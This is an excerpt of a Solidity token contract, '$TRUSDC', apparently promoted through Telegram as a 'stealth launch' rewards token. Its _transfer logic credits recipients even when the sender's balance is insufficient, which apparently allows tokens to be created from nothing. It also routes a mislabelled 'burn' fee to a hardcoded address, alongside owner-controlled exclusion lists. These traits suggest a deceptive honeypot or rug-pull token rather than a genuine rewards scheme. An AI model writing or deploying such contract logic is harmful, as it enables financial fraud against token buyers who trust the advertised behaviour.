...
// Submitted for Telegram: https://t.me/tokenrewards15percentUSDC
// STEALTH LAUNCH
// $TRUSDC ( Token Rewards 15% USDC )
...
contract  TRUSDC  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Token Rewards 15Percent USDC";
    string private _symbol = "$TRUSDC";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d, _bruntoken);
        }
